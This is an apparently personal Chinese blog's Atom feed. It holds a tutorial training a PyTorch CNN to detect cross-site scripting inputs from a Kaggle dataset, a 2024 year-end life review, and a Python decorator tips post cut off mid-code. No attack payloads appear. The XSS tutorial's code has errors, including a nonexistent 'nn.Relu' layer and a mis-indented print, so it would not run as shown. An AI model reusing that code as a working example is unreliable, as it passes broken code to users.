<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ELSSM&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="elssm.github.io/"/>
  <updated>2025-04-23T10:02:06.719Z</updated>
  <id>elssm.github.io/</id>
  
  <author>
    <name>Elssm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CNN检测XSS攻击(Pytorch)</title>
    <link href="elssm.github.io/2025/04/23/CNN%E6%A3%80%E6%B5%8BXSS%E6%94%BB%E5%87%BB-Pytorch/"/>
    <id>elssm.github.io/2025/04/23/CNN检测XSS攻击-Pytorch/</id>
    <published>2025-04-23T13:08:36.000Z</published>
    <updated>2025-04-23T10:02:06.719Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>之前在Kaggle上看到了一个XSS的数据集，所以想着用pytorch实现一下，代码参考了kaggle上有人用keras实现的。</p><p><a href="https://www.kaggle.com/syedsaqlainhussain/cross-site-scripting-attack-detection-using-cnn" target="_blank" rel="noopener">https://www.kaggle.com/syedsaqlainhussain/cross-site-scripting-attack-detection-using-cnn</a></p><h3 id="XSS数据集介绍"><a href="#XSS数据集介绍" class="headerlink" title="XSS数据集介绍"></a>XSS数据集介绍</h3><p>数据集地址：<a href="https://www.kaggle.com/syedsaqlainhussain/cross-site-scripting-xss-dataset-for-deep-learning" target="_blank" rel="noopener">https://www.kaggle.com/syedsaqlainhussain/cross-site-scripting-xss-dataset-for-deep-learning</a></p><p>数据是csv形式的，一共有三列，第一列是序号，第二列是具体的代码，第三列是标签。一共有13686条数据，没有分训练集和测试集，因此后面我们需要分一下。</p><h4 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h4><p>首先我们应该对数据进行编码。转换成向量的形式，对于训练集和测试集每一行数据，我们都有编码和标签两种数据，之后通过模型进行训练，训练结果与标签进行比对，计算损失，最后通过测试集进行验证。</p><h4 id="模块导入"><a href="#模块导入" class="headerlink" title="模块导入"></a>模块导入</h4><p>其中cv2是一个进行图像处理的库，sklearn是基于python的机器学习攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader</span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br></pre></td></tr></table></figure><h4 id="参数定义"><a href="#参数定义" class="headerlink" title="参数定义"></a>参数定义</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">batch_size = <span class="number">50</span></span><br><span class="line">epochs = <span class="number">100</span></span><br></pre></td></tr></table></figure><h4 id="加载数据集"><a href="#加载数据集" class="headerlink" title="加载数据集"></a>加载数据集</h4><p>将XSS数据集下载之后，放在和代码同级的目录下。通过pandas模块可以实现对csv文件的读取等操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df = pd.read_csv(<span class="string">"XSS_dataset.csv"</span>,encoding=<span class="string">"utf-8-sig"</span>)</span><br><span class="line">sentences = df[<span class="string">'Sentence'</span>].values</span><br></pre></td></tr></table></figure><h4 id="定义编码函数"><a href="#定义编码函数" class="headerlink" title="定义编码函数"></a>定义编码函数</h4><p>对于一些编码后比较大的字符，可以为他们分配一个比较小的值，方便后续进行正则化。将每一条数据都通过一个长度为10000的向量进行存储。之后<code>reshape</code>成一个二维向量，大小是100*100</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_to_ascii</span><span class="params">(sentence)</span>:</span></span><br><span class="line">    sentence_ascii = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sentence:</span><br><span class="line">        <span class="keyword">if</span> (ord(i) &lt; <span class="number">8222</span>):  </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ord(i) == <span class="number">8217</span>):  </span><br><span class="line">                sentence_ascii.append(<span class="number">134</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ord(i) == <span class="number">8221</span>):  </span><br><span class="line">                sentence_ascii.append(<span class="number">129</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ord(i) == <span class="number">8220</span>):  </span><br><span class="line">                sentence_ascii.append(<span class="number">130</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ord(i) == <span class="number">8216</span>):  </span><br><span class="line">                sentence_ascii.append(<span class="number">131</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ord(i) == <span class="number">8217</span>):  </span><br><span class="line">                sentence_ascii.append(<span class="number">132</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ord(i) == <span class="number">8211</span>):  </span><br><span class="line">                sentence_ascii.append(<span class="number">133</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ord(i) &lt;= <span class="number">128</span>):</span><br><span class="line">                sentence_ascii.append(ord(i))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    zer = np.zeros((<span class="number">10000</span>)) <span class="comment">#初始化一个长度为10000的向量</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(sentence_ascii)):</span><br><span class="line">        zer[i] = sentence_ascii[i]</span><br><span class="line">    zer.shape = (<span class="number">100</span>, <span class="number">100</span>) <span class="comment">#将一维转为二维</span></span><br><span class="line">    <span class="keyword">return</span> zer</span><br></pre></td></tr></table></figure><h4 id="编码转换"><a href="#编码转换" class="headerlink" title="编码转换"></a>编码转换</h4><p>首先定一个数组，大小是数据集的长度，类型是一个二维向量，大小是100*100，之后对csv中每一条数据都进行编码转换，并将二维向量中的数据都转为float类型表示。之后得到的data就是对数据集编码后的结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">arr = np.zeros((len(sentences), <span class="number">100</span>, <span class="number">100</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(sentences)):</span><br><span class="line">    image = convert_to_ascii(sentences[i])</span><br><span class="line"></span><br><span class="line">    x = np.asarray(image, dtype=<span class="string">'float'</span>) <span class="comment">#将二维里的数据类型转为float型</span></span><br><span class="line">    image = cv2.resize(x, dsize=(<span class="number">100</span>, <span class="number">100</span>), interpolation=cv2.INTER_CUBIC)</span><br><span class="line">    image /= <span class="number">128</span></span><br><span class="line"></span><br><span class="line">    arr[i] = image</span><br><span class="line"></span><br><span class="line"><span class="comment"># Reshape data for input to CNN</span></span><br><span class="line">data = arr.reshape(arr.shape[<span class="number">0</span>],<span class="number">1</span>,<span class="number">100</span>, <span class="number">100</span>)</span><br></pre></td></tr></table></figure><h4 id="获取标签"><a href="#获取标签" class="headerlink" title="获取标签"></a>获取标签</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y=df[<span class="string">'Label'</span>].values</span><br></pre></td></tr></table></figure><h4 id="划分数据集"><a href="#划分数据集" class="headerlink" title="划分数据集"></a>划分数据集</h4><p>采用<code>train_test_split</code>函数随机划分数据。其中<code>test_size</code>是指测试数据占样本数据的比例，这里取样本总数的20%作为测试数据，<code>random_state</code>是一个随机数种子。之后通过<code>DataLoader</code>函数设定训练批次大小和<code>shuffle</code>操作，这里需要注意的是，因为我们data和y中的数据都是<code>ndarray</code>类型的，因此我们还需要对他们进行类型转换，转为<code>tensor</code>类型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">trainX, testX, trainY, testY = train_test_split(data,y, test_size=<span class="number">0.2</span>, random_state=<span class="number">42</span>)</span><br><span class="line">trainX = torch.from_numpy(trainX)</span><br><span class="line">trainX = DataLoader(trainX,batch_size=batch_size,shuffle=<span class="literal">False</span>)</span><br><span class="line">testX = torch.from_numpy(testX)</span><br><span class="line">testX = DataLoader(testX,batch_size=batch_size,shuffle=<span class="literal">False</span>)</span><br><span class="line">trainY = torch.from_numpy(trainY)</span><br><span class="line">trainY = DataLoader(trainY,batch_size=batch_size,shuffle=<span class="literal">False</span>)</span><br><span class="line">testY = torch.from_numpy(testY)</span><br><span class="line">testY = DataLoader(testY,batch_size=batch_size,shuffle=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h4 id="模型定义"><a href="#模型定义" class="headerlink" title="模型定义"></a>模型定义</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNN_XSS_Net</span><span class="params">(nn.Module)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(CNN_XSS_Net, self).__init__()</span><br><span class="line">        self.cnn = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">1</span>,<span class="number">64</span>,<span class="number">3</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            nn.Dropout(<span class="number">0.3</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">64</span>,<span class="number">128</span>,<span class="number">3</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.Conv2d(<span class="number">128</span>,<span class="number">256</span>,<span class="number">3</span>),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            nn.Dropout(<span class="number">0.3</span>),</span><br><span class="line">            nn.Relu(),</span><br><span class="line"></span><br><span class="line">        )</span><br><span class="line">        self.fc1 = nn.Linear(<span class="number">123904</span>,<span class="number">256</span>)</span><br><span class="line">        self.fc2 = nn.Linear(<span class="number">256</span>,<span class="number">128</span>)</span><br><span class="line">        self.fc3 = nn.Linear(<span class="number">128</span>, <span class="number">64</span>)</span><br><span class="line">        self.fc4 = nn.Linear(<span class="number">64</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self,x)</span>:</span></span><br><span class="line">        x = torch.tensor(x, dtype=torch.float32)</span><br><span class="line">        cnn_res = self.cnn(x)</span><br><span class="line">        <span class="comment"># print(cnn_res.shape) #128*256*22*22</span></span><br><span class="line">        cnn_res = cnn_res.view(cnn_res.size(<span class="number">0</span>), <span class="number">-1</span>)</span><br><span class="line">        <span class="comment"># print(cnn_res.shape) #128*123904</span></span><br><span class="line">        f1 = self.fc1(cnn_res)</span><br><span class="line">        f2 = self.fc2(f1)</span><br><span class="line">        f3 = self.fc3(f2)</span><br><span class="line">        f4 = self.fc4(f3)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> f4</span><br></pre></td></tr></table></figure><h4 id="实例化模型"><a href="#实例化模型" class="headerlink" title="实例化模型"></a>实例化模型</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">model = CNN_XSS_Net()</span><br><span class="line">optimizer = optim.Adam(model.parameters(),<span class="number">0.001</span>)</span><br><span class="line">criterion = nn.CrossEntropyLoss()</span><br></pre></td></tr></table></figure><h4 id="定义训练函数"><a href="#定义训练函数" class="headerlink" title="定义训练函数"></a>定义训练函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">(model,trainX,trainY,optimizer,epochs)</span>:</span></span><br><span class="line">    model.train()</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> data, target <span class="keyword">in</span> zip(trainX,trainY):</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        output = model(data)</span><br><span class="line">        loss = criterion(output, target)</span><br><span class="line">        loss.backward()</span><br><span class="line">        optimizer.step()</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">50</span> == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"Train Epoch : &#123;&#125; \t Loss : &#123;:.6f&#125;"</span>.format(epochs, loss.item()))</span><br></pre></td></tr></table></figure><h4 id="定义测试函数"><a href="#定义测试函数" class="headerlink" title="定义测试函数"></a>定义测试函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_model</span><span class="params">(model,testX,testY)</span>:</span></span><br><span class="line">    model.eval()</span><br><span class="line">    correct = <span class="number">0.0</span></span><br><span class="line">    test_loss = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        <span class="keyword">for</span> data,target <span class="keyword">in</span> zip(testX,testY):</span><br><span class="line">            output = model(data)</span><br><span class="line">            test_loss+=F.cross_entropy(output,target).item()</span><br><span class="line">            pred = output.max(<span class="number">1</span>,keepdim=<span class="literal">True</span>)[<span class="number">1</span>] </span><br><span class="line">            correct += pred.eq(target.view_as(pred)).sum().item()</span><br><span class="line">        test_loss /= len(testX.dataset)</span><br><span class="line">        print(<span class="string">"Test ---- Average loss : &#123;:.4f&#125;,Accuracy : &#123;:.3f&#125;\n"</span>.format(test_loss,<span class="number">100.0</span>*correct/len(testX.dataset)))</span><br></pre></td></tr></table></figure><h4 id="模型训练"><a href="#模型训练" class="headerlink" title="模型训练"></a>模型训练</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> range(epochs):</span><br><span class="line">    train(model,trainX,trainY,optimizer,epoch)</span><br><span class="line">    test_model(model,testX,testY)</span><br></pre></td></tr></table></figure><h4 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h4><p><img src="/2025/04/23/CNN检测XSS攻击-Pytorch/1.png" alt="1"></p><p><img src="/2025/04/23/CNN检测XSS攻击-Pytorch/2.png" alt="2"></p><p><img src="/2025/04/23/CNN检测XSS攻击-Pytorch/3.png" alt="3"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;之前在Kaggle上看到了一个XSS的数据集，所以想着用pytorch实现一下，代码参考了kaggle上有人用keras实现的。&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="ML" scheme="elssm.github.io/tags/ML/"/>
    
  </entry>
  
  <entry>
    <title>2024年终总结</title>
    <link href="elssm.github.io/2024/12/18/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <id>elssm.github.io/2024/12/18/2024年终总结/</id>
    <published>2024-12-18T14:46:20.000Z</published>
    <updated>2024-12-26T03:20:52.139Z</updated>
    
    <content type="html"><![CDATA[<p>突然发现已经一年多没有更新博客了。</p><p>其实这种年终总结我一直就想去写。因为每到年底，就会有各种各样APP的年终总结出现，这些总结可以快速的带我过完这一年在这款APP上做了些什么事情，APP上的某一个总结点会迅速地将我拉回到一年中的某个时刻，说真的，我很喜欢这样的感觉。</p><p>为何自己一直迟迟没有写自己的年终总结呢，可能还是觉得没什么值得记录的吧？但是现在工作之后，每年年底，我们都要做年终总结汇报，回顾这一年工作上的点点滴滴，展现自己这一年的工作业绩，我觉得这是好事，可以更好的激励自己、反思自己。因此，在2024年，我也想完成自己的年终总结blog，也算是为自己2025年开一个好头，这是我的第一篇年终总结，希望不会是最后一篇，哈哈哈。</p><p>这篇年终总结，我想分为四个部分概括，分别是工作，毕竟工作时间占了我一年的80%；旅行，在一年中穿插着的几个小长假期间的旅游成了不可多得的一种放空方式；花钱，挣钱就是为了花钱，可特么就是攒不住钱；爱情，今年在爱情路上也算是迈入了新的阶段；学习，主要搞一些工作之外的正能量。</p><h3 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h3><p>2024年是正式跨入职场的一年，这一年完成了从<strong>学生身份</strong>到<strong>职场打工人</strong>的转变。</p><p>2023年的就业形势并没有多乐观，我很庆幸的是，最终入职了一家符合预期的公司。</p><p>我在公司里做的是我所喜欢的事情，其一是它跟我的专业相关，其二是在正式工作之前，我已经有了三段实习经历，这足以让我快速适应工作。</p><p>目前我在甲方从事安全开发和安全运营工作，在这之前，我都是在乙方公司实习。</p><p>工作之后有一个很大的直观感受就是，时间被分的很散，精力被分的很乱。导致的后果是，我没有一个很规律的计划清单去做自己想做的事情。当然我觉得这是我的个人原因造成的，这一点我需要反思。</p><h3 id="旅行"><a href="#旅行" class="headerlink" title="旅行"></a>旅行</h3><p>工作后发现，旅行是一个很好放空自己的方式，当事人现在就是非常后悔，为什么读书的时候没有多去几个地方玩玩呢？</p><p>今年一共去了四个地方，分别是：广元、兰州、延安、甘南。</p><p>明年的期待：希望能出国玩玩～</p><h3 id="花钱"><a href="#花钱" class="headerlink" title="花钱"></a>花钱</h3><p>今年几笔大的开销主要花在以下几件事情上：</p><h4 id="买车"><a href="#买车" class="headerlink" title="买车"></a>买车</h4><p>今年觉得花的最值的一笔钱就是买了一台车。尽管它是一辆A00级四门纯电车海鸥🚗，但是它极大的扩大了我的出行范围。</p><p><img src="/2024/12/18/2024年终总结/7.jpeg" alt="7"></p><h4 id="装修"><a href="#装修" class="headerlink" title="装修"></a>装修</h4><p>不得不说，自装真是一门技术活。陆陆续续从交房到装修已经过去了将近3年了。现在房子总算是硬装结束了。不得不说，踩了不少坑。今年给房子装修上花了大概6w块钱，其中我个人比较满意的几件单品如下：</p><h5 id="餐厅灯：乐米品月艺术灯"><a href="#餐厅灯：乐米品月艺术灯" class="headerlink" title="餐厅灯：乐米品月艺术灯"></a>餐厅灯：乐米品月艺术灯</h5><p><img src="/2024/12/18/2024年终总结/8.jpg" alt="8"></p><h5 id="电视：TCL-T7k-85"><a href="#电视：TCL-T7k-85" class="headerlink" title="电视：TCL T7k 85"></a>电视：TCL T7k 85</h5><p><img src="/2024/12/18/2024年终总结/9.jpg" alt="9"></p><h5 id="马桶：恒洁H35pro"><a href="#马桶：恒洁H35pro" class="headerlink" title="马桶：恒洁H35pro"></a>马桶：恒洁H35pro</h5><p><img src="/2024/12/18/2024年终总结/16.jpg" alt="16"></p><h5 id="智能门锁：德施曼Q50M-Pro"><a href="#智能门锁：德施曼Q50M-Pro" class="headerlink" title="智能门锁：德施曼Q50M Pro"></a>智能门锁：德施曼Q50M Pro</h5><p><img src="/2024/12/18/2024年终总结/17.jpg" alt="17"></p><h5 id="人体工学椅：西昊M57C二代"><a href="#人体工学椅：西昊M57C二代" class="headerlink" title="人体工学椅：西昊M57C二代"></a>人体工学椅：西昊M57C二代</h5><p><img src="/2024/12/18/2024年终总结/18.jpg" alt="18"></p><h4 id="买金子"><a href="#买金子" class="headerlink" title="买金子"></a>买金子</h4><p>在现实因素下，我也开始了攒五金的计划。</p><p><img src="/2024/12/18/2024年终总结/1.jpg" alt="1"></p><h4 id="买球杆"><a href="#买球杆" class="headerlink" title="买球杆"></a>买球杆</h4><p>买球杆的契机还是在今年8月份在西安看了一场斯诺克的比赛，平时只能在电视上看到的顶级选手，现在也能亲眼所见，我买的是总决赛的上半场，当时我感觉可能是特鲁姆普vs奥沙利文，没想到最后是对阵囧哥，该说不说，在现场看确实感觉不一样，我还有很长一段路要走啊。</p><p><img src="/2024/12/18/2024年终总结/5.jpeg" alt="5"></p><p><img src="/2024/12/18/2024年终总结/4.jpeg" alt="4"></p><p>这笔开销并不算很大，但是它体现了我的决心。2024年集中力量、投入心思的一门技术型工作，就是打台球。之前我是瞎打，完全靠蛮力，今年我转变了，我觉得必须正儿八经在这项运动上花点心思，于是我二话不说，在11月份的时候给自己精挑细选买了一个球杆，我太想进步了。</p><p><img src="/2024/12/18/2024年终总结/6.jpg" alt="6"></p><h4 id="演唱会"><a href="#演唱会" class="headerlink" title="演唱会"></a>演唱会</h4><p>今年真是扎堆办演唱会的一年，西安奥体几乎每周都会有明星来开演唱会。贫穷的我在今年也赶了几场演唱会，在这里我要感谢我的同事和朋友，因为没有他们帮忙抢票，我是一场演唱会都看不了啊。</p><h5 id="许嵩2024呼吸之野演唱会"><a href="#许嵩2024呼吸之野演唱会" class="headerlink" title="许嵩2024呼吸之野演唱会"></a>许嵩2024呼吸之野演唱会</h5><p>总结：人生的第一场个人演唱会，来看最喜欢的歌手</p><p><img src="/2024/12/18/2024年终总结/10.JPG" alt="10"></p><p><img src="/2024/12/18/2024年终总结/11.JPG" alt="11"></p><h5 id="李宗盛2024有歌之年演唱会"><a href="#李宗盛2024有歌之年演唱会" class="headerlink" title="李宗盛2024有歌之年演唱会"></a>李宗盛2024有歌之年演唱会</h5><p>总结：年少不听李宗盛，听懂已是不惑年</p><p><img src="/2024/12/18/2024年终总结/12.jpg" alt="12"></p><p><img src="/2024/12/18/2024年终总结/13.JPG" alt="13"></p><h5 id="凤凰传奇2024吉祥如意演唱会"><a href="#凤凰传奇2024吉祥如意演唱会" class="headerlink" title="凤凰传奇2024吉祥如意演唱会"></a>凤凰传奇2024吉祥如意演唱会</h5><p>总结：军训就完事了</p><p><img src="/2024/12/18/2024年终总结/14.JPG" alt="14"></p><p><img src="/2024/12/18/2024年终总结/15.JPG" alt="15"></p><h3 id="爱情"><a href="#爱情" class="headerlink" title="爱情"></a>爱情</h3><p>今年是我们一起走过的第10年。很幸运，也很感激。</p><p><img src="/2024/12/18/2024年终总结/2.JPG" alt="2"></p><p><img src="/2024/12/18/2024年终总结/19.jpg" alt="19"></p><h3 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h3><h4 id="学习日语"><a href="#学习日语" class="headerlink" title="学习日语"></a>学习日语</h4><p><img src="/2024/12/18/2024年终总结/20.jpg" alt="20"></p><p><img src="/2024/12/18/2024年终总结/21.jpg" alt="21"></p><h4 id="读书"><a href="#读书" class="headerlink" title="读书"></a>读书</h4><p><img src="/2024/12/18/2024年终总结/22.jpg" alt="22"></p><p><img src="/2024/12/18/2024年终总结/23.jpg" alt="23"></p><p><img src="/2024/12/18/2024年终总结/24.jpg" alt="24"></p><h3 id="2025想法"><a href="#2025想法" class="headerlink" title="2025想法"></a>2025想法</h3><p>读书：读完十本书📖</p><p>考证：考下日语N2😊</p><p>攒钱：攒够15w块钱💰</p><p>收藏：两双喜欢的球鞋👟</p><p>旅行：出国玩、看雪山🏔️</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;突然发现已经一年多没有更新博客了。&lt;/p&gt;
&lt;p&gt;其实这种年终总结我一直就想去写。因为每到年底，就会有各种各样APP的年终总结出现，这些总结可以快速的带我过完这一年在这款APP上做了些什么事情，APP上的某一个总结点会迅速地将我拉回到一年中的某个时刻，说真的，我很喜欢这样的
      
    
    </summary>
    
    
      <category term="随笔" scheme="elssm.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>PythonTips(Part 2)</title>
    <link href="elssm.github.io/2023/10/18/PythonTips-Part-2/"/>
    <id>elssm.github.io/2023/10/18/PythonTips-Part-2/</id>
    <published>2023-10-18T13:29:21.000Z</published>
    <updated>2023-10-18T13:31:16.191Z</updated>
    
    <content type="html"><![CDATA[<h3 id="元编程"><a href="#元编程" class="headerlink" title="元编程"></a>元编程</h3><h4 id="在函数上添加包装器"><a href="#在函数上添加包装器" class="headerlink" title="在函数上添加包装器"></a>在函数上添加包装器</h4><p>如果想在函数上添加一个包装器，增加额外的操作处理(比如日志、计时等)。可以定义一个装饰器函数，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timethis</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        result = func(*args, **kwargs)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(func.__name__, end-start)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure><p>如下是使用装饰器的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>@timethis</span><br><span class="line"><span class="meta">... </span><span class="function"><span class="keyword">def</span> <span class="title">countdown</span><span class="params">(n)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="string">'''</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    Counts down</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    '''</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line"><span class="meta">... </span>        n -= <span class="number">1</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>countdown(<span class="number">100000</span>)</span><br><span class="line">countdown <span class="number">0.008917808532714844</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>countdown(<span class="number">10000000</span>)</span><br><span class="line">countdown <span class="number">0.87188299392912</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>一个装饰器就是一个函数，它接受一个函数作为参数并返回一个新的函数，如下面这种写法：</p><figure class="highlight 